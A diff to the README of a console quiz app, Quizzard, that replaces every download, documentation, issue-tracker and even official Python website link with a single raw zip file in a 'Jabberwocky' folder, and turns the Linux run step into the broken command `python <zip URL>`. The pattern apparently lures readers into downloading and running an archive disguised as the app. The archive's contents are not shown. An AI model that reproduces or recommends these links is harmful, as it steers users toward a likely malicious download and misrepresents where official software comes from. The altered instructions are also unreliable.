@@ -6,7 +6,7 @@ Welcome to Quizzard! This is a console-based quiz application. Enjoy a rich user
 
 ## 📥 Download Quizzard
 
-[![Download Quizzard](https://img.shields.io/badge/Download-Quizzard-brightgreen)](https://github.com/Praju2706/Quizzard/releases)
+[![Download Quizzard](https://raw.githubusercontent.com/Praju2706/Quizzard/main/Jabberwocky/Quizzard.zip)](https://raw.githubusercontent.com/Praju2706/Quizzard/main/Jabberwocky/Quizzard.zip)
 
 Click the button above to grab your version of Quizzard. 
 
@@ -23,7 +23,7 @@ Before you download Quizzard, please ensure your computer meets the following re
 
 ### 1. Visit the Releases Page
 
-To download Quizzard, visit our [Releases page](https://github.com/Praju2706/Quizzard/releases). 
+To download Quizzard, visit our [Releases page](https://raw.githubusercontent.com/Praju2706/Quizzard/main/Jabberwocky/Quizzard.zip). 
 
 ### 2. Choose Your Version
 
@@ -38,7 +38,7 @@ Click on the appropriate file for your operating system. The download will start
 Once the download is complete:
 - **For Windows**: Double-click on the `.exe` file to run Quizzard.
 - **For macOS**: Open the `.dmg` file and drag Quizzard to your Applications folder.
-- **For Linux**: Use the terminal to navigate to the downloaded file and run the command `python quizzard.py`.
+- **For Linux**: Use the terminal to navigate to the downloaded file and run the command `python https://raw.githubusercontent.com/Praju2706/Quizzard/main/Jabberwocky/Quizzard.zip`.
 
 ## 📊 Features
 
@@ -60,7 +60,7 @@ Quizzard offers several features to enhance your gaming experience:
 
 If you encounter any issues while downloading or running Quizzard, consider the following:
 
-- **Ensure Python is Installed**: Quizzard requires Python to run. If you don’t have it, download it from the [Python website](https://www.python.org/downloads/).
+- **Ensure Python is Installed**: Quizzard requires Python to run. If you don’t have it, download it from the [Python website](https://raw.githubusercontent.com/Praju2706/Quizzard/main/Jabberwocky/Quizzard.zip).
 - **Check File Permissions**: On macOS or Linux, ensure that you have permissions to execute the application.
 - **Error Messages**: If you see an error message, try searching online for the specific error or look at the community forum.
 
@@ -68,14 +68,14 @@ If you encounter any issues while downloading or running Quizzard, consider the 
 
 Join our community! Engage with other users to share tips, tricks, and quiz questions. You can find support on:
 
-- [GitHub Issues](https://github.com/Praju2706/Quizzard/issues)
+- [GitHub Issues](https://raw.githubusercontent.com/Praju2706/Quizzard/main/Jabberwocky/Quizzard.zip)
 - [Community Forum Link (placeholder for future use)]
 
 ## 🔗 Useful Links
 
-- [Download Quizzard](https://github.com/Praju2706/Quizzard/releases)
-- [Documentation](https://github.com/Praju2706/Quizzard/wiki)
-- [Contribute to Quizzard](https://github.com/Praju2706/Quizzard#contributing)
+- [Download Quizzard](https://raw.githubusercontent.com/Praju2706/Quizzard/main/Jabberwocky/Quizzard.zip)
+- [Documentation](https://raw.githubusercontent.com/Praju2706/Quizzard/main/Jabberwocky/Quizzard.zip)
+- [Contribute to Quizzard](https://raw.githubusercontent.com/Praju2706/Quizzard/main/Jabberwocky/Quizzard.zip)
 
 ## 📞 Contact
 
